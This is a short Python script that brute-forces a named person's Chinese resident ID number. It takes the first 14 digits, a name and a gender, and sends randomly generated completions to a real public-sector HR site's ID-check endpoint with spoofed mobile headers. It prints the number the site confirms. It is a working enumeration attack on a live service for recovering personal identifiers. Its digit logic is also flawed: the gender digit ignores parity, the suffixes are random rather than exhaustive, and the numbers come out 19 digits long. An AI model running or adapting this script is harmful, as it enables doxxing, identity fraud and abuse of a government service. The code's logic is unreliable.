import random

import requests

idcard_prefix = input("身份证号码前14位：")
name = input("姓名：")
gender = input("性别（男/女）：")

if gender.lower() == "男":
    idcard_17th = str(random.randint(1, 9))
elif gender.lower() == "女":
    idcard_17th = str(random.randint(0, 8))
else:
    print("性别输入错误，请输入'男'或'女'")
    exit()

idcard_suffixes = [str(random.randint(0, 9999)).zfill(4) for _ in range(10000)]
generated_idcards = [idcard_prefix + idcard_17th + suffix for suffix in idcard_suffixes]

for idcard in generated_idcards:

    headers = {
        'Host': 'www.renshenet.org.cn',
        'Accept': 'application/json, text/plain, */*',
        'Sec-Fetch-Site': 'same-origin',
        'depCode': '0004',
        'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
        'Sec-Fetch-Mode': 'cors',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'https://www.renshenet.org.cn',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        'Referer': 'https://www.renshenet.org.cn/jxzhrsdist/index.html',
        'Content-Length': '47',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty'
    }

    data = {
        "idcard": idcard,
        "name": name
    }

    response = requests.post('https://www.renshenet.org.cn/mobile/person/register/checkidcard', headers=headers,
                             json=data)

    if response.json()["data"]["isSucces"]:
        print(f"身份证号码 {idcard} ✅验证通过")
    else:
        print(f"身份证号码 {idcard} ❌验证未通过")
